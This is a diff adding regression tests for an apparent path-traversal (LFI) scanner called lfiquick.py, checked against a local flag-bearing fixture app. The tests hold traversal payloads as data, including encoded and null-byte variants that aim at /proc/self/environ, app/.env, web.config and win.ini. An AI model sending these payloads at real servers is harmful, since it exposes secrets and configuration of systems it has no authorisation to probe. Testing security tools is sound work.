@@ -1997,6 +1997,101 @@ class LfiquickRegressionTest(unittest.TestCase):
                 records = [json.loads(line) for line in fh if line.strip()]
             self.assertEqual(records[-1]["headers"]["X-Flag"], fixture_app.LFI_HEADER_FLAG)
 
+    def test_linux_environment_is_swept_with_confirmed_double_slash_dialect(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            proc = run_full(
+                "lfiquick.py", "--url", self.url("linux-env"),
+                "--style", "double-slash", "--max-depth", "2", "--delay", "0",
+                "--out", tmp)
+            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
+            self.assertIn("CONFIRMED file read: style=double-slash depth=2", proc.stdout)
+            self.assertIn("FLAG " + fixture_app.LFI_ENV_FLAG, proc.stdout)
+            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
+                records = [json.loads(line) for line in fh if line.strip()]
+            self.assertEqual(records[-1]["raw_value"], "..//..//proc/self/environ")
+
+    def test_windows_signature_drives_config_and_objective_sweep(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            proc = run_full(
+                "lfiquick.py", "--url", self.url("windows"),
+                "--style", "backslash", "--max-depth", "2", "--delay", "0",
+                "--out", tmp)
+            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
+            self.assertIn("Windows win.ini signature", proc.stdout)
+            self.assertIn("FLAG " + fixture_app.LFI_WINDOWS_FLAG, proc.stdout)
+            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
+                records = [json.loads(line) for line in fh if line.strip()]
+            self.assertEqual(
+                records[-1]["raw_value"],
+                "..\\..\\inetpub\\wwwroot\\web.config")
+
+    def test_seclists_derived_encoded_style_is_preserved_and_reused(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            proc = run_full(
+                "lfiquick.py", "--url", self.url("slash-encoded"),
+                "--style", "dot-encoded", "--max-depth", "2", "--delay", "0",
+                "--out", tmp)
+            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
+            self.assertIn("CONFIRMED file read: style=dot-encoded depth=2", proc.stdout)
+            self.assertIn("FLAG " + fixture_app.LFI_ENV_FLAG, proc.stdout)
+            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
+                records = [json.loads(line) for line in fh if line.strip()]
+            self.assertEqual(
+                records[-1]["raw_value"],
+                "%2e%2e%2f%2e%2e%2fapp/.env")
+            self.assertIn("%2e%2e%2f", records[-1]["url"].lower())
+
+    def test_alternate_signature_recovers_when_passwd_is_filtered(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            proc = run_full(
+                "lfiquick.py", "--url", self.url("passwd-blocked"),
+                "--style", "plain", "--max-depth", "2", "--delay", "0",
+                "--out", tmp)
+            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
+            self.assertIn("/proc/self/status signature", proc.stdout)
+            self.assertIn("FLAG " + fixture_app.LFI_ENV_FLAG, proc.stdout)
+            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
+                records = [json.loads(line) for line in fh if line.strip()]
+            fallback = next(record for record in records
+                            if record["label"] == "fallback:plain:proc_self_status")
+            self.assertEqual(fallback["raw_value"], "../../proc/self/status")
+            self.assertEqual(records[-1]["raw_value"], "../../app/.env")
+
+    def test_extended_profile_is_bounded_separately_from_core(self):
+        help_proc = run_full("lfiquick.py", "--help")
+        self.assertEqual(help_proc.returncode, 0, help_proc.stdout + help_proc.stderr)
+        self.assertIn("128 core, 260 extended", help_proc.stdout)
+        self.assertIn("unicode-backslash", help_proc.stdout)
+
+    def test_extended_profile_tries_legacy_suffix_only_at_deepest_depth(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            proc = run_full(
+                "lfiquick.py", "--url", self.url("legacy-null"),
+                "--profile", "extended", "--style", "plain",
+                "--max-depth", "1", "--delay", "0", "--out", tmp)
+            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
+            self.assertIn("FLAG " + fixture_app.LFI_FLAG, proc.stdout)
+            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
+                records = [json.loads(line) for line in fh if line.strip()]
+            self.assertEqual(records[-1]["label"], "legacy:plain:flag.txtpct00")
+            self.assertEqual(records[-1]["raw_value"], "../flag.txt%00")
+            self.assertIn("%00", records[-1]["url"])
+
+    def test_core_matrix_exhausts_within_its_default_budget(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            proc = run_full(
+                "lfiquick.py", "--url", self.url("safe"),
+                "--profile", "core", "--delay", "0", "--out", tmp)
+            self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
+            self.assertIn("bounded traversal set found no confirmed file read", proc.stdout)
+            self.assertNotIn("probe budget reached", proc.stdout)
+            with open(os.path.join(tmp, "probes.jsonl"), encoding="utf-8") as fh:
+                records = [json.loads(line) for line in fh if line.strip()]
+            self.assertLessEqual(len(records), 128)
+            self.assertTrue(any(record["raw_value"] == "C:/Windows/win.ini"
+                                for record in records))
+            self.assertTrue(any("%252f" in record["raw_value"] for record in records))
+
     def test_invalid_baseline_stops_before_traversal(self):
         with tempfile.TemporaryDirectory() as tmp:
             proc = run_full(
